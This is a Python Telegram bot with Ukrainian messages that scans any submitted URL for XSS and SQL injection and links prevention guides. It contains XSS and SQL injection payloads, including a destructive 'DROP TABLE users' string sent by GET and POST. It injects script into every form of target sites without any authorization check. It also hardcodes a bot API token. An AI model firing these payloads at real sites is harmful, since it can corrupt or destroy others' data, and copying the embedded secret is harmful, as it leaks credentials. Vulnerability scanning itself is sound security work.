import asyncio
import logging
import sys
import aiohttp
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import Message
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.chat_action import ChatActionSender
from bs4 import BeautifulSoup
import re

API_TOKEN = '7646243199:AAE5pE4xGMUJdfW_zzFgyp18Ja8PZajC19U'

bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(bot=bot)


def get_security_tip(vulnerability_type):
    tips = {
        "Reflected XSS": "1. https://docs.veracode.com/r/reflected-xss",
        "Stored XSS": "1. https://docs.veracode.com/r/stored-xss",
        "DOM-based XSS": "1. https://www.acunetix.com/blog/web-security-zone/how-to-prevent-dom-based-cross-site-scripting/",
        "SQL Injection": "1. https://www.acunetix.com/websitesecurity/sql-injection/"
    }
    return tips.get(vulnerability_type, "Немає конкретних порад для цієї вразливості.")


async def check_reflected_xss(url, session):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "'\"><script>alert('XSS')</script>"
    ]
    parameters = ["search", "query", "q", "test", "input"]
    
    for param in parameters:
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            try:
                async with session.get(test_url) as response:
                    text = await response.text()
                    if payload in text:
                        return True, f"Reflected XSS with parameter: {param}"
            except aiohttp.client_exceptions.TooManyRedirects:
                print(f"Too many redirects for URL: {test_url}")
                return False, f"Too many redirects detected for parameter: {param}"
    return False, None


async def check_stored_xss(url, session):
    async with session.get(url) as response:
        text = await response.text()
    soup = BeautifulSoup(text, 'html.parser')
    forms = soup.find_all('form')

    if not forms:
        return False, None

    for form in forms:
        action = form.get('action')
        form_url = url if action is None else url + action
        method = form.get('method', 'get').lower()
        inputs = form.find_all(['input', 'textarea', 'select'])

        data = {input_tag.get('name'): "<script>alert('XSS')</script>" for input_tag in inputs if input_tag.get('name')}

        if method == 'post':
            async with session.post(form_url, data=data) as _:
                pass
        else:
            async with session.get(form_url, params=data) as _:
                pass

        async with session.get(url) as new_response:
            new_text = await new_response.text()
            if "<script>alert('XSS')</script>" in new_text:
                return True, "Stored XSS"
    return False, None


async def check_dom_xss(url, session):
    async with session.get(url) as response:
        text = await response.text()
    if "document.write" in text or "innerHTML" in text:
        return True, "DOM-based XSS"
    return False, None


async def scan_sql_injection(url, params, session):
    payloads = [
        "' OR '1'='1'; --",
        "' UNION SELECT NULL, NULL, NULL; --",
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "' AND 1=1 --",
        "' OR 'x'='x",
        "' AND 'x'='x",
        "';--",
        "' /*", 
        "'+OR+1=1--"
    ]
    
    vulnerabilities = []
    
    for param, value in params:
        for payload in payloads:
            formatted_payload = payload.format(value)
            try:
                async with session.get(url, params={param: formatted_payload}) as response:
                    text = await response.text()
                    if "error" in text or "syntax" in text or "database" in text:  
                        vulnerabilities.append(
                            f"SQL Injection at {url} with param '{param}' and payload '{formatted_payload}'"
                        )
            

                async with session.post(url, data={param: formatted_payload}) as response:
                    text = await response.text()
                    if "error" in text or "syntax" in text or "database" in text:  
                        vulnerabilities.append(
                            f"SQL Injection at {url} with param '{param}' and payload '{formatted_payload}'"
                        )

            except aiohttp.ClientError as e:
                print(f"Error: {e}")
    
    return vulnerabilities


@dp.message(Command("start"))
async def command_start_handler(message: Message):
    await message.answer("Надішліть мені URL-адресу, і я перевірю її на вразливості XSS і SQL-ін’єкції!")


@dp.message(F.text)
async def handle_text_message(message: Message):
    urls = re.findall(r'(https?://[^\s]+)', message.text)
    if not urls:
        await message.reply("❌ Повідомлення не містить URL-адрес.")
        return

    async with aiohttp.ClientSession() as session:
        for url in urls:
            await scan_url(url, message, session)


async def scan_url(url, message, session):
    async with ChatActionSender(action="typing", chat_id=message.chat.id, bot=bot):
        reflected_xss, reflected_type = await check_reflected_xss(url, session)
        stored_xss, stored_type = await check_stored_xss(url, session)
        dom_xss, dom_type = await check_dom_xss(url, session)

        sql_injection_params = [('search', 'test'), ]  
        sql_injection = await scan_sql_injection(url, sql_injection_params, session)

        vulnerabilities = []
        if reflected_xss:
            vulnerabilities.append(reflected_type)
        if stored_xss:
            vulnerabilities.append(stored_type)
        if dom_xss:
            vulnerabilities.append(dom_type)
        if sql_injection:
            vulnerabilities.extend(sql_injection)

        if vulnerabilities:
            response = f"⚠️ Виявлені вразливості для {url}:\n" + "\n".join(vulnerabilities)
            for vuln in vulnerabilities:
                response += f"\nРекомендації: {get_security_tip(vuln)}"
            await message.reply(response, disable_web_page_preview=True)
        else:
            await message.reply(f"✅ Вразливості для {url} не виявлено.", disable_web_page_preview=True)


async def main():
    logging.basicConfig(level=logging.INFO, stream=sys.stdout)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
